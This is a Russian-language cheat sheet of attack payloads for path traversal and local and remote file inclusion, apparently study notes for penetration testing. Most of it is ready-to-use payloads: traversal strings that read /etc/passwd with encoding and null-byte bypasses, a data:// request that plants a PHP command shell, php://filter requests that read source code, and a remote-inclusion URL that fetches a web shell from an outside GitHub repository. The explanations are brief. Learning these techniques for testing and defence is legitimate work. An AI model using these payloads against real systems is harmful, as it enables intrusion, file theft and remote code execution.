## Полезные материалы

1. [PayloadsAllTheThings/File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
2. [PayloadsAllTheThings/Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)
3. [PayloadsAllTheThings/Client Side Path Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Client%20Side%20Path%20Traversal)

---

## Обход методов защиты от **Path Traversal**

1. ../../../etc/passwd
2. ....//....//....//etc/passwd
3. ../../../etc/passwd
4. ..%2F..%2F..%2Fetc/passwd - URL Decode
5. ..%252F..%252F..%252F - URL double decode
6. {/now/directory/}../../../etc/passwd
7. ../../../etc/passwd%00.jpg

---

## File Inclusion

Уязвимость File Inclusion (включение файла) позволяет злоумышленнику "включить" файл в ответ, обычно используя механизмы "динамического включения файлов", реализованные в целевом приложении.

Если файл, включённый в ответ, нельзя исполнить (т.к. его расширение веб-сервер не исполняет), то это Directory Traversal, но если сервер настроен на исполнение файлов с таким расширением и этот файл можно запустить, таким образом исполняя зловредный скрипт, будет уязвимость **Local file inclusion** или **Remote file inclusion**.

---

## Эксплуатация LFI/RFI

[PayloadsAllTheThings/File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

Пример GET запроса из браузера, где с помощью схемы "data" создаётся примитивный PHP Shell:
```
.../?file=data://text/plain,<?php system($_GET['cmd']) ?>&cmd=printenv
```

Если нужно прочитать php код, а не исполнить:
```
.../?page=php://filter/read=string.rot13/resource=index.php
.../?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
.../?page=php://filter/convert.base64-encode/resource=index.php
.../?page=pHp://FilTer/convert.base64-encode/resource=index.php
```

В RFI можно исполнить удалённый файл, например Shell с гитхаба. Гитхаб с шелами: [tennc/webshell](https://github.com/tennc/webshell).
Пример:
```
.../?file=https://raw.githubusercontent.com/tennc/webshell/refs/heads/master/fuzzdb-webshell/php/cmd.php
```
